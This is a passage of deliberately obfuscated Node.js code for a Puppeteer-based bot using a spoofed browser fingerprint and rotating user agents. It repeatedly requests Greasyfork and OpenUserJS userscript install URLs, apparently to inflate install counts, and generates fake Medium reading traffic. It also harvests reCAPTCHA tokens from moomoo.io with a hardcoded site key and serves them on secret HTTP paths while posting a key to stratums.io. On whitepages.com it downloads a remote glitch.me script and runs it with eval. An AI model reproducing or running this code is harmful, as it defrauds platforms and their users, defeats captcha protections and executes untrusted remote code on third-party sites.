      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + W(0x18) + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + X(0xe, '6%Ur') + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x10) + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x8) + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + W(0x5) + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + X(0x19, 'O)w]') + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1c3f + 0xbb + 0x1b84
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1fee * -0x1 + 0x1 * -0x72d + -0xd09 * -0x3)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1 * 0x28d + 0x262d + -0x2856), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * 0xd83 + 0x3 * 0x5bd + -0x1e56), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x144e + -0x1 * -0x1813 + -0x657 * 0x7;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x943 * -0x2 + -0x92a + 0x10 * 0x1bb; w < getRandomInt(0x1 * 0x18c7 + 0x2132 + -0x39f8, -0x3d * 0x8d + 0x1 * 0x1a38 + -0x766 * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xe43 * 0xe + 0xe15 + 0x14a1);
        }
      }();
    }, 0x1226 + -0x41 * 0x3a + -0x184 * 0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const Z = c;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })[Z(0x4)](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x12d2 + -0xf87 + 0x2259;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1ca5 + 0x1a7f + 0x4 * -0xdc9, 0x2600 + 0x39a + 0x28 * -0x109)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x23 * -0x3a6 + -0x869a * 0x1 + -0x1 * -0x17b7c);
    }, 0x87c * 0x4 + -0x15e1 + -0x1 * 0xbab), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xb * 0x71 + 0x348 * -0x2 + 0xb6b;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x51b * -0x3 + 0x1 * 0x333 + -0x6cc), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1d * 0xfe + -0x1 * -0x85f + 0x1 * 0x1467), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x216 * 0xca0 + -0x8 * 0x6c0 + 0xb * -0x12060);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x837 + 0x1388 + -0xaed * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xada + 0x6f3 * -0x3 + -0x1 * -0x207b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env'][X(0xd, 'XoZ1')] || -0x166d * 0x1 + 0x1 * 0x2bee + 0x67 * 0x19);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = d,
    a2 = b,
    a1 = c;
  async function f() {
    const a0 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x8b * -0x40 + 0x1 + 0x458 * -0x8) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x112 * 0x1c + 0x1114 + -0x2f0b * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x3bb * -0xa + 0xee3 + 0x166b, D['indexOf']('\x20'));
        return B ? E['slice'](-0x976 * -0x1 + 0xfb * 0x5 + -0xe5d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x303d + -0x148 * -0x25 + -0x3895),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x[a0(0x0)]['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2a71 + 0x1291 + -0x7de * -0x8),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + a1(0x13) + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + a2(0x3, 'L^a(') + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + a3(0x12) + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
